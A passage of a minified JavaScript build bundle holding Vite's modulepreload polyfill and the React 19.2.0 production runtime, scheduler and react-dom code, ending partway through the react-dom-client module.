(function(){const U=document.createElement("link").relList;if(U&&U.supports&&U.supports("modulepreload"))return;for(const L of document.querySelectorAll('link[rel="modulepreload"]'))m(L);new MutationObserver(L=>{for(const Y of L)if(Y.type==="childList")for(const Z of Y.addedNodes)Z.tagName==="LINK"&&Z.rel==="modulepreload"&&m(Z)}).observe(document,{childList:!0,subtree:!0});function B(L){const Y={};return L.integrity&&(Y.integrity=L.integrity),L.referrerPolicy&&(Y.referrerPolicy=L.referrerPolicy),L.crossOrigin==="use-credentials"?Y.credentials="include":L.crossOrigin==="anonymous"?Y.credentials="omit":Y.credentials="same-origin",Y}function m(L){if(L.ep)return;L.ep=!0;const Y=B(L);fetch(L.href,Y)}})();var sc={exports:{}},bn={};/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var pf;function Wp(){if(pf)return bn;pf=1;var S=Symbol.for("react.transitional.element"),U=Symbol.for("react.fragment");function B(m,L,Y){var Z=null;if(Y!==void 0&&(Z=""+Y),L.key!==void 0&&(Z=""+L.key),"key"in L){Y={};for(var fe in L)fe!=="key"&&(Y[fe]=L[fe])}else Y=L;return L=Y.ref,{$$typeof:S,type:m,key:Z,ref:L!==void 0?L:null,props:Y}}return bn.Fragment=U,bn.jsx=B,bn.jsxs=B,bn}var hf;function Jp(){return hf||(hf=1,sc.exports=Wp()),sc.exports}var u=Jp(),ic={exports:{}},K={};/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var gf;function Pp(){if(gf)return K;gf=1;var S=Symbol.for("react.transitional.element"),U=Symbol.for("react.portal"),B=Symbol.for("react.fragment"),m=Symbol.for("react.strict_mode"),L=Symbol.for("react.profiler"),Y=Symbol.for("react.consumer"),Z=Symbol.for("react.context"),fe=Symbol.for("react.forward_ref"),q=Symbol.for("react.suspense"),b=Symbol.for("react.memo"),M=Symbol.for("react.lazy"),D=Symbol.for("react.activity"),H=Symbol.iterator;function ne(r){return r===null||typeof r!="object"?null:(r=H&&r[H]||r["@@iterator"],typeof r=="function"?r:null)}var me={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},xe=Object.assign,Be={};function Ye(r,p,x){this.props=r,this.context=p,this.refs=Be,this.updater=x||me}Ye.prototype.isReactComponent={},Ye.prototype.setState=function(r,p){if(typeof r!="object"&&typeof r!="function"&&r!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,r,p,"setState")},Ye.prototype.forceUpdate=function(r){this.updater.enqueueForceUpdate(this,r,"forceUpdate")};function Ct(){}Ct.prototype=Ye.prototype;function ke(r,p,x){this.props=r,this.context=p,this.refs=Be,this.updater=x||me}var Ve=ke.prototype=new Ct;Ve.constructor=ke,xe(Ve,Ye.prototype),Ve.isPureReactComponent=!0;var dt=Array.isArray;function He(){}var $={H:null,A:null,T:null,S:null},Ge=Object.prototype.hasOwnProperty;function Fe(r,p,x){var k=x.ref;return{$$typeof:S,type:r,key:p,ref:k!==void 0?k:null,props:x}}function Jt(r,p){return Fe(r.type,p,r.props)}function ft(r){return typeof r=="object"&&r!==null&&r.$$typeof===S}function Ce(r){var p={"=":"=0",":":"=2"};return"$"+r.replace(/[=:]/g,function(x){return p[x]})}var qt=/\/+/g;function Tt(r,p){return typeof r=="object"&&r!==null&&r.key!=null?Ce(""+r.key):p.toString(36)}function et(r){switch(r.status){case"fulfilled":return r.value;case"rejected":throw r.reason;default:switch(typeof r.status=="string"?r.then(He,He):(r.status="pending",r.then(function(p){r.status==="pending"&&(r.status="fulfilled",r.value=p)},function(p){r.status==="pending"&&(r.status="rejected",r.reason=p)})),r.status){case"fulfilled":return r.value;case"rejected":throw r.reason}}throw r}function _(r,p,x,k,z){var V=typeof r;(V==="undefined"||V==="boolean")&&(r=null);var P=!1;if(r===null)P=!0;else switch(V){case"bigint":case"string":case"number":P=!0;break;case"object":switch(r.$$typeof){case S:case U:P=!0;break;case M:return P=r._init,_(P(r._payload),p,x,k,z)}}if(P)return z=z(r),P=k===""?"."+Tt(r,0):k,dt(z)?(x="",P!=null&&(x=P.replace(qt,"$&/")+"/"),_(z,p,x,"",function(xl){return xl})):z!=null&&(ft(z)&&(z=Jt(z,x+(z.key==null||r&&r.key===z.key?"":(""+z.key).replace(qt,"$&/")+"/")+P)),p.push(z)),1;P=0;var Oe=k===""?".":k+":";if(dt(r))for(var ge=0;ge<r.length;ge++)k=r[ge],V=Oe+Tt(k,ge),P+=_(k,p,x,V,z);else if(ge=ne(r),typeof ge=="function")for(r=ge.call(r),ge=0;!(k=r.next()).done;)k=k.value,V=Oe+Tt(k,ge++),P+=_(k,p,x,V,z);else if(V==="object"){if(typeof r.then=="function")return _(et(r),p,x,k,z);throw p=String(r),Error("Objects are not valid as a React child (found: "+(p==="[object Object]"?"object with keys {"+Object.keys(r).join(", ")+"}":p)+"). If you meant to render a collection of children, use an array instead.")}return P}function O(r,p,x){if(r==null)return r;var k=[],z=0;return _(r,k,"","",function(V){return p.call(x,V,z++)}),k}function Q(r){if(r._status===-1){var p=r._result;p=p(),p.then(function(x){(r._status===0||r._status===-1)&&(r._status=1,r._result=x)},function(x){(r._status===0||r._status===-1)&&(r._status=2,r._result=x)}),r._status===-1&&(r._status=0,r._result=p)}if(r._status===1)return r._result.default;throw r._result}var A=typeof reportError=="function"?reportError:function(r){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var p=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof r=="object"&&r!==null&&typeof r.message=="string"?String(r.message):String(r),error:r});if(!window.dispatchEvent(p))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",r);return}console.error(r)},C={map:O,forEach:function(r,p,x){O(r,function(){p.apply(this,arguments)},x)},count:function(r){var p=0;return O(r,function(){p++}),p},toArray:function(r){return O(r,function(p){return p})||[]},only:function(r){if(!ft(r))throw Error("React.Children.only expected to receive a single React element child.");return r}};return K.Activity=D,K.Children=C,K.Component=Ye,K.Fragment=B,K.Profiler=L,K.PureComponent=ke,K.StrictMode=m,K.Suspense=q,K.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=$,K.__COMPILER_RUNTIME={__proto__:null,c:function(r){return $.H.useMemoCache(r)}},K.cache=function(r){return function(){return r.apply(null,arguments)}},K.cacheSignal=function(){return null},K.cloneElement=function(r,p,x){if(r==null)throw Error("The argument must be a React element, but you passed "+r+".");var k=xe({},r.props),z=r.key;if(p!=null)for(V in p.key!==void 0&&(z=""+p.key),p)!Ge.call(p,V)||V==="key"||V==="__self"||V==="__source"||V==="ref"&&p.ref===void 0||(k[V]=p[V]);var V=arguments.length-2;if(V===1)k.children=x;else if(1<V){for(var P=Array(V),Oe=0;Oe<V;Oe++)P[Oe]=arguments[Oe+2];k.children=P}return Fe(r.type,z,k)},K.createContext=function(r){return r={$$typeof:Z,_currentValue:r,_currentValue2:r,_threadCount:0,Provider:null,Consumer:null},r.Provider=r,r.Consumer={$$typeof:Y,_context:r},r},K.createElement=function(r,p,x){var k,z={},V=null;if(p!=null)for(k in p.key!==void 0&&(V=""+p.key),p)Ge.call(p,k)&&k!=="key"&&k!=="__self"&&k!=="__source"&&(z[k]=p[k]);var P=arguments.length-2;if(P===1)z.children=x;else if(1<P){for(var Oe=Array(P),ge=0;ge<P;ge++)Oe[ge]=arguments[ge+2];z.children=Oe}if(r&&r.defaultProps)for(k in P=r.defaultProps,P)z[k]===void 0&&(z[k]=P[k]);return Fe(r,V,z)},K.createRef=function(){return{current:null}},K.forwardRef=function(r){return{$$typeof:fe,render:r}},K.isValidElement=ft,K.lazy=function(r){return{$$typeof:M,_payload:{_status:-1,_result:r},_init:Q}},K.memo=function(r,p){return{$$typeof:b,type:r,compare:p===void 0?null:p}},K.startTransition=function(r){var p=$.T,x={};$.T=x;try{var k=r(),z=$.S;z!==null&&z(x,k),typeof k=="object"&&k!==null&&typeof k.then=="function"&&k.then(He,A)}catch(V){A(V)}finally{p!==null&&x.types!==null&&(p.types=x.types),$.T=p}},K.unstable_useCacheRefresh=function(){return $.H.useCacheRefresh()},K.use=function(r){return $.H.use(r)},K.useActionState=function(r,p,x){return $.H.useActionState(r,p,x)},K.useCallback=function(r,p){return $.H.useCallback(r,p)},K.useContext=function(r){return $.H.useContext(r)},K.useDebugValue=function(){},K.useDeferredValue=function(r,p){return $.H.useDeferredValue(r,p)},K.useEffect=function(r,p){return $.H.useEffect(r,p)},K.useEffectEvent=function(r){return $.H.useEffectEvent(r)},K.useId=function(){return $.H.useId()},K.useImperativeHandle=function(r,p,x){return $.H.useImperativeHandle(r,p,x)},K.useInsertionEffect=function(r,p){return $.H.useInsertionEffect(r,p)},K.useLayoutEffect=function(r,p){return $.H.useLayoutEffect(r,p)},K.useMemo=function(r,p){return $.H.useMemo(r,p)},K.useOptimistic=function(r,p){return $.H.useOptimistic(r,p)},K.useReducer=function(r,p,x){return $.H.useReducer(r,p,x)},K.useRef=function(r){return $.H.useRef(r)},K.useState=function(r){return $.H.useState(r)},K.useSyncExternalStore=function(r,p,x){return $.H.useSyncExternalStore(r,p,x)},K.useTransition=function(){return $.H.useTransition()},K.version="19.2.0",K}var yf;function dc(){return yf||(yf=1,ic.exports=Pp()),ic.exports}var Ne=dc(),oc={exports:{}},En={},cc={exports:{}},uc={};/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var vf;function Fp(){return vf||(vf=1,(function(S){function U(_,O){var Q=_.length;_.push(O);e:for(;0<Q;){var A=Q-1>>>1,C=_[A];if(0<L(C,O))_[A]=O,_[Q]=C,Q=A;else break e}}function B(_){return _.length===0?null:_[0]}function m(_){if(_.length===0)return null;var O=_[0],Q=_.pop();if(Q!==O){_[0]=Q;e:for(var A=0,C=_.length,r=C>>>1;A<r;){var p=2*(A+1)-1,x=_[p],k=p+1,z=_[k];if(0>L(x,Q))k<C&&0>L(z,x)?(_[A]=z,_[k]=Q,A=k):(_[A]=x,_[p]=Q,A=p);else if(k<C&&0>L(z,Q))_[A]=z,_[k]=Q,A=k;else break e}}return O}function L(_,O){var Q=_.sortIndex-O.sortIndex;return Q!==0?Q:_.id-O.id}if(S.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var Y=performance;S.unstable_now=function(){return Y.now()}}else{var Z=Date,fe=Z.now();S.unstable_now=function(){return Z.now()-fe}}var q=[],b=[],M=1,D=null,H=3,ne=!1,me=!1,xe=!1,Be=!1,Ye=typeof setTimeout=="function"?setTimeout:null,Ct=typeof clearTimeout=="function"?clearTimeout:null,ke=typeof setImmediate<"u"?setImmediate:null;function Ve(_){for(var O=B(b);O!==null;){if(O.callback===null)m(b);else if(O.startTime<=_)m(b),O.sortIndex=O.expirationTime,U(q,O);else break;O=B(b)}}function dt(_){if(xe=!1,Ve(_),!me)if(B(q)!==null)me=!0,He||(He=!0,Ce());else{var O=B(b);O!==null&&et(dt,O.startTime-_)}}var He=!1,$=-1,Ge=5,Fe=-1;function Jt(){return Be?!0:!(S.unstable_now()-Fe<Ge)}function ft(){if(Be=!1,He){var _=S.unstable_now();Fe=_;var O=!0;try{e:{me=!1,xe&&(xe=!1,Ct($),$=-1),ne=!0;var Q=H;try{t:{for(Ve(_),D=B(q);D!==null&&!(D.expirationTime>_&&Jt());){var A=D.callback;if(typeof A=="function"){D.callback=null,H=D.priorityLevel;var C=A(D.expirationTime<=_);if(_=S.unstable_now(),typeof C=="function"){D.callback=C,Ve(_),O=!0;break t}D===B(q)&&m(q),Ve(_)}else m(q);D=B(q)}if(D!==null)O=!0;else{var r=B(b);r!==null&&et(dt,r.startTime-_),O=!1}}break e}finally{D=null,H=Q,ne=!1}O=void 0}}finally{O?Ce():He=!1}}}var Ce;if(typeof ke=="function")Ce=function(){ke(ft)};else if(typeof MessageChannel<"u"){var qt=new MessageChannel,Tt=qt.port2;qt.port1.onmessage=ft,Ce=function(){Tt.postMessage(null)}}else Ce=function(){Ye(ft,0)};function et(_,O){$=Ye(function(){_(S.unstable_now())},O)}S.unstable_IdlePriority=5,S.unstable_ImmediatePriority=1,S.unstable_LowPriority=4,S.unstable_NormalPriority=3,S.unstable_Profiling=null,S.unstable_UserBlockingPriority=2,S.unstable_cancelCallback=function(_){_.callback=null},S.unstable_forceFrameRate=function(_){0>_||125<_?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):Ge=0<_?Math.floor(1e3/_):5},S.unstable_getCurrentPriorityLevel=function(){return H},S.unstable_next=function(_){switch(H){case 1:case 2:case 3:var O=3;break;default:O=H}var Q=H;H=O;try{return _()}finally{H=Q}},S.unstable_requestPaint=function(){Be=!0},S.unstable_runWithPriority=function(_,O){switch(_){case 1:case 2:case 3:case 4:case 5:break;default:_=3}var Q=H;H=_;try{return O()}finally{H=Q}},S.unstable_scheduleCallback=function(_,O,Q){var A=S.unstable_now();switch(typeof Q=="object"&&Q!==null?(Q=Q.delay,Q=typeof Q=="number"&&0<Q?A+Q:A):Q=A,_){case 1:var C=-1;break;case 2:C=250;break;case 5:C=1073741823;break;case 4:C=1e4;break;default:C=5e3}return C=Q+C,_={id:M++,callback:O,priorityLevel:_,startTime:Q,expirationTime:C,sortIndex:-1},Q>A?(_.sortIndex=Q,U(b,_),B(q)===null&&_===B(b)&&(xe?(Ct($),$=-1):xe=!0,et(dt,Q-A))):(_.sortIndex=C,U(q,_),me||ne||(me=!0,He||(He=!0,Ce()))),_},S.unstable_shouldYield=Jt,S.unstable_wrapCallback=function(_){var O=H;return function(){var Q=H;H=O;try{return _.apply(this,arguments)}finally{H=Q}}}})(uc)),uc}var Sf;function e0(){return Sf||(Sf=1,cc.exports=Fp()),cc.exports}var rc={exports:{}},Qe={};/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var bf;function t0(){if(bf)return Qe;bf=1;var S=dc();function U(q){var b="https://react.dev/errors/"+q;if(1<arguments.length){b+="?args[]="+encodeURIComponent(arguments[1]);for(var M=2;M<arguments.length;M++)b+="&args[]="+encodeURIComponent(arguments[M])}return"Minified React error #"+q+"; visit "+b+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function B(){}var m={d:{f:B,r:function(){throw Error(U(522))},D:B,C:B,L:B,m:B,X:B,S:B,M:B},p:0,findDOMNode:null},L=Symbol.for("react.portal");function Y(q,b,M){var D=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:L,key:D==null?null:""+D,children:q,containerInfo:b,implementation:M}}var Z=S.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function fe(q,b){if(q==="font")return"";if(typeof b=="string")return b==="use-credentials"?b:""}return Qe.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=m,Qe.createPortal=function(q,b){var M=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!b||b.nodeType!==1&&b.nodeType!==9&&b.nodeType!==11)throw Error(U(299));return Y(q,b,null,M)},Qe.flushSync=function(q){var b=Z.T,M=m.p;try{if(Z.T=null,m.p=2,q)return q()}finally{Z.T=b,m.p=M,m.d.f()}},Qe.preconnect=function(q,b){typeof q=="string"&&(b?(b=b.crossOrigin,b=typeof b=="string"?b==="use-credentials"?b:"":void 0):b=null,m.d.C(q,b))},Qe.prefetchDNS=function(q){typeof q=="string"&&m.d.D(q)},Qe.preinit=function(q,b){if(typeof q=="string"&&b&&typeof b.as=="string"){var M=b.as,D=fe(M,b.crossOrigin),H=typeof b.integrity=="string"?b.integrity:void 0,ne=typeof b.fetchPriority=="string"?b.fetchPriority:void 0;M==="style"?m.d.S(q,typeof b.precedence=="string"?b.precedence:void 0,{crossOrigin:D,integrity:H,fetchPriority:ne}):M==="script"&&m.d.X(q,{crossOrigin:D,integrity:H,fetchPriority:ne,nonce:typeof b.nonce=="string"?b.nonce:void 0})}},Qe.preinitModule=function(q,b){if(typeof q=="string")if(typeof b=="object"&&b!==null){if(b.as==null||b.as==="script"){var M=fe(b.as,b.crossOrigin);m.d.M(q,{crossOrigin:M,integrity:typeof b.integrity=="string"?b.integrity:void 0,nonce:typeof b.nonce=="string"?b.nonce:void 0})}}else b==null&&m.d.M(q)},Qe.preload=function(q,b){if(typeof q=="string"&&typeof b=="object"&&b!==null&&typeof b.as=="string"){var M=b.as,D=fe(M,b.crossOrigin);m.d.L(q,M,{crossOrigin:D,integrity:typeof b.integrity=="string"?b.integrity:void 0,nonce:typeof b.nonce=="string"?b.nonce:void 0,type:typeof b.type=="string"?b.type:void 0,fetchPriority:typeof b.fetchPriority=="string"?b.fetchPriority:void 0,referrerPolicy:typeof b.referrerPolicy=="string"?b.referrerPolicy:void 0,imageSrcSet:typeof b.imageSrcSet=="string"?b.imageSrcSet:void 0,imageSizes:typeof b.imageSizes=="string"?b.imageSizes:void 0,media:typeof b.media=="string"?b.media:void 0})}},Qe.preloadModule=function(q,b){if(typeof q=="string")if(b){var M=fe(b.as,b.crossOrigin);m.d.m(q,{as:typeof b.as=="string"&&b.as!=="script"?b.as:void 0,crossOrigin:M,integrity:typeof b.integrity=="string"?b.integrity:void 0})}else m.d.m(q)},Qe.requestFormReset=function(q){m.d.r(q)},Qe.unstable_batchedUpdates=function(q,b){return q(b)},Qe.useFormState=function(q,b,M){return Z.H.useFormState(q,b,M)},Qe.useFormStatus=function(){return Z.H.useHostTransitionStatus()},Qe.version="19.2.0",Qe}var Ef;function a0(){if(Ef)return rc.exports;Ef=1;function S(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(S)}catch(U){console.error(U)}}return S(),rc.exports=t0(),rc.exports}/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var _f;function l0(){if(_f)return En;_f=1;var S=e0(),U=dc(),B=a0();function m(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var a=2;a<arguments.length;a++)t+="&args[]="+encodeURIComponent(arguments[a])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function L(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Y(e){var t=e,a=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(a=t.return),e=t.return;while(e)}return t.tag===3?a:null}function Z(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function fe(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function q(e){if(Y(e)!==e)throw Error(m(188))}function b(e){var t=e.alternate;if(!t){if(t=Y(e),t===null)throw Error(m(188));return t!==e?null:e}for(var a=e,l=t;;){var n=a.return;if(n===null)break;var s=n.alternate;if(s===null){if(l=n.return,l!==null){a=l;continue}break}if(n.child===s.child){for(s=n.child;s;){if(s===a)return q(n),e;if(s===l)return q(n),t;s=s.sibling}throw Error(m(188))}if(a.return!==l.return)a=n,l=s;else{for(var i=!1,o=n.child;o;){if(o===a){i=!0,a=n,l=s;break}if(o===l){i=!0,l=n,a=s;break}o=o.sibling}if(!i){for(o=s.child;o;){if(o===a){i=!0,a=s,l=n;break}if(o===l){i=!0,l=s,a=n;break}o=o.sibling}if(!i)throw Error(m(189))}}if(a.alternate!==l)throw Error(m(190))}if(a.tag!==3)throw Error(m(188));return a.stateNode.current===a?e:t}function M(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=M(e),t!==null)return t;e=e.sibling}return null}var D=Object.assign,H=Symbol.for("react.element"),ne=Symbol.for("react.transitional.element"),me=Symbol.for("react.portal"),xe=Symbol.for("react.fragment"),Be=Symbol.for("react.strict_mode"),Ye=Symbol.for("react.profiler"),Ct=Symbol.for("react.consumer"),ke=Symbol.for("react.context"),Ve=Symbol.for("react.forward_ref"),dt=Symbol.for("react.suspense"),He=Symbol.for("react.suspense_list"),$=Symbol.for("react.memo"),Ge=Symbol.for("react.lazy"),Fe=Symbol.for("react.activity"),Jt=Symbol.for("react.memo_cache_sentinel"),ft=Symbol.iterator;function Ce(e){return e===null||typeof e!="object"?null:(e=ft&&e[ft]||e["@@iterator"],typeof e=="function"?e:null)}var qt=Symbol.for("react.client.reference");function Tt(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===qt?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case xe:return"Fragment";case Ye:return"Profiler";case Be:return"StrictMode";case dt:return"Suspense";case He:return"SuspenseList";case Fe:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case me:return"Portal";case ke:return e.displayName||"Context";case Ct:return(e._context.displayName||"Context")+".Consumer";case Ve:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case $:return t=e.displayName||null,t!==null?t:Tt(e.type)||"Memo";case Ge:t=e._payload,e=e._init;try{return Tt(e(t))}catch{}}return null}var et=Array.isArray,_=U.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,O=B.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,Q={pending:!1,data:null,method:null,action:null},A=[],C=-1;function r(e){return{current:e}}function p(e){0>C||(e.current=A[C],A[C]=null,C--)}function x(e,t){C++,A[C]=e.current,e.current=t}var k=r(null),z=r(null),V=r(null),P=r(null);function Oe(e,t){switch(x(V,t),x(z,e),x(k,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?Ud(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=Ud(t),e=zd(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}p(k),x(k,e)}function ge(){p(k),p(z),p(V)}function xl(e){e.memoizedState!==null&&x(P,e);var t=k.current,a=zd(t,e.type);t!==a&&(x(z,e),x(k,a))}function _n(e){z.current===e&&(p(k),p(z)),P.current===e&&(p(P),gn._currentValue=Q)}var Hs,fc;function Ta(e){if(Hs===void 0)try{throw Error()}catch(a){var t=a.stack.trim().match(/\n( *(at )?)/);Hs=t&&t[1]||"",fc=-1<a.stack.indexOf(`
    at`)?" (<anonymous>)":-1<a.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Hs+e+fc}var Gs=!1;function Qs(e,t){if(!e||Gs)return"";Gs=!0;var a=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var l={DetermineComponentFrameRoot:function(){try{if(t){var R=function(){throw Error()};if(Object.defineProperty(R.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(R,[])}catch(v){var y=v}Reflect.construct(e,[],R)}else{try{R.call()}catch(v){y=v}e.call(R.prototype)}}else{try{throw Error()}catch(v){y=v}(R=e())&&typeof R.catch=="function"&&R.catch(function(){})}}catch(v){if(v&&y&&typeof v.stack=="string")return[v.stack,y.stack]}return[null,null]}};l.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var n=Object.getOwnPropertyDescriptor(l.DetermineComponentFrameRoot,"name");n&&n.configurable&&Object.defineProperty(l.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var s=l.DetermineComponentFrameRoot(),i=s[0],o=s[1];if(i&&o){var c=i.split(`
`),g=o.split(`
`);for(n=l=0;l<c.length&&!c[l].includes("DetermineComponentFrameRoot");)l++;for(;n<g.length&&!g[n].includes("DetermineComponentFrameRoot");)n++;if(l===c.length||n===g.length)for(l=c.length-1,n=g.length-1;1<=l&&0<=n&&c[l]!==g[n];)n--;for(;1<=l&&0<=n;l--,n--)if(c[l]!==g[n]){if(l!==1||n!==1)do if(l--,n--,0>n||c[l]!==g[n]){var E=`
`+c[l].replace(" at new "," at ");return e.displayName&&E.includes("<anonymous>")&&(E=E.replace("<anonymous>",e.displayName)),E}while(1<=l&&0<=n);break}}}finally{Gs=!1,Error.prepareStackTrace=a}return(a=e?e.displayName||e.name:"")?Ta(a):""}function Cf(e,t){switch(e.tag){case 26:case 27:case 5:return Ta(e.type);case 16:return Ta("Lazy");case 13:return e.child!==t&&t!==null?Ta("Suspense Fallback"):Ta("Suspense");case 19:return Ta("SuspenseList");case 0:case 15:return Qs(e.type,!1);case 11:return Qs(e.type.render,!1);case 1:return Qs(e.type,!0);case 31:return Ta("Activity");default:return""}}function mc(e){try{var t="",a=null;do t+=Cf(e,a),a=e,e=e.return;while(e);return t}catch(l){return`
Error generating stack: `+l.message+`
`+l.stack}}var Ys=Object.prototype.hasOwnProperty,Ks=S.unstable_scheduleCallback,Vs=S.unstable_cancelCallback,Of=S.unstable_shouldYield,Df=S.unstable_requestPaint,tt=S.unstable_now,kf=S.unstable_getCurrentPriorityLevel,pc=S.unstable_ImmediatePriority,hc=S.unstable_UserBlockingPriority,Tn=S.unstable_NormalPriority,Mf=S.unstable_LowPriority,gc=S.unstable_IdlePriority,qf=S.log,Nf=S.unstable_setDisableYieldValue,Cl=null,at=null;function Pt(e){if(typeof qf=="function"&&Nf(e),at&&typeof at.setStrictMode=="function")try{at.setStrictMode(Cl,e)}catch{}}var lt=Math.clz32?Math.clz32:Uf,Lf=Math.log,wf=Math.LN2;function Uf(e){return e>>>=0,e===0?32:31-(Lf(e)/wf|0)|0}var Rn=256,An=262144,xn=4194304;function Ra(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Cn(e,t,a){var l=e.pendingLanes;if(l===0)return 0;var n=0,s=e.suspendedLanes,i=e.pingedLanes;e=e.warmLanes;var o=l&134217727;return o!==0?(l=o&~s,l!==0?n=Ra(l):(i&=o,i!==0?n=Ra(i):a||(a=o&~e,a!==0&&(n=Ra(a))))):(o=l&~s,o!==0?n=Ra(o):i!==0?n=Ra(i):a||(a=l&~e,a!==0&&(n=Ra(a)))),n===0?0:t!==0&&t!==n&&(t&s)===0&&(s=n&-n,a=t&-t,s>=a||s===32&&(a&4194048)!==0)?t:n}function Ol(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function zf(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function yc(){var e=xn;return xn<<=1,(xn&62914560)===0&&(xn=4194304),e}function Xs(e){for(var t=[],a=0;31>a;a++)t.push(e);return t}function Dl(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function jf(e,t,a,l,n,s){var i=e.pendingLanes;e.pendingLanes=a,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=a,e.entangledLanes&=a,e.errorRecoveryDisabledLanes&=a,e.shellSuspendCounter=0;var o=e.entanglements,c=e.expirationTimes,g=e.hiddenUpdates;for(a=i&~a;0<a;){var E=31-lt(a),R=1<<E;o[E]=0,c[E]=-1;var y=g[E];if(y!==null)for(g[E]=null,E=0;E<y.length;E++){var v=y[E];v!==null&&(v.lane&=-536870913)}a&=~R}l!==0&&vc(e,l,0),s!==0&&n===0&&e.tag!==0&&(e.suspendedLanes|=s&~(i&~t))}function vc(e,t,a){e.pendingLanes|=t,e.suspendedLanes&=~t;var l=31-lt(t);e.entangledLanes|=t,e.entanglements[l]=e.entanglements[l]|1073741824|a&261930}function Sc(e,t){var a=e.entangledLanes|=t;for(e=e.entanglements;a;){var l=31-lt(a),n=1<<l;n&t|e[l]&t&&(e[l]|=t),a&=~n}}function bc(e,t){var a=t&-t;return a=(a&42)!==0?1:Is(a),(a&(e.suspendedLanes|t))!==0?0:a}function Is(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function Zs(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function Ec(){var e=O.p;return e!==0?e:(e=window.event,e===void 